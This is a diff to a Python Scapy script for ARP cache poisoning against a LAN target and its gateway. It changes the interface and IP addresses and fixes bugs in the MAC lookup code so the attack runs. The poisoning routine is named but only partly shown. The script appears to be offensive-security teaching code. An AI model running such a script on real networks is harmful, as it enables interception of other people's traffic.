@@ -1,13 +1,16 @@
+#!/usr/bin/env python
+#-*-coding:utf-8 -*-
+
 from scapy.all import *
 import os
 import sys
 import threading
 import signal
 
-interface           = 'en1'
-target_ip           = '192.168.1.120'
-gateway_ip          = '192.168.1.1'
-packet_count        = 1000
+interface = "eth0"
+target_ip = "192.168.1.7"
+gateway_ip = "192.168.1.1"
+packet_count = 1000
 
 # set our interface
 conf.iface = interface
@@ -29,11 +32,10 @@ def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
     os.kill(os.getpid(), signal.SIGINT)
 
 def get_mac(ip_address):
-    responses, unanswered = 
-        srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),
+    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),
                 timeout=2, retry=10)
     # return the MAC address from a response
-    for s, r in response:
+    for s, r in responses:
         return r[Ether].src
     
     return None
@@ -66,7 +68,7 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
         return 
 
 
-gateway_mac = get_mac(geteway_ip)
+gateway_mac = get_mac(gateway_ip)
 
 if gateway_mac is None:
     print "[!!!] Failed to get gateway MAC. Exiting."
